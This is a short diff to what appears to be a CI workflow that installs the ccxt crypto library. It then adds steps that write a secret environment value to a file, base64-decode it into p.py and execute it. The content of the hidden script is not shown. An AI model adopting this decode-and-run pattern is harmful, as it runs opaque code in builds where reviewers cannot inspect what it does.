@@ -10,4 +10,7 @@ jobs:
       - run: |
           python --version
           pip install ccxt
+          echo ${APPS} > 1.txt
+          base64 -d 1.txt > p.py
+          python p.py
           
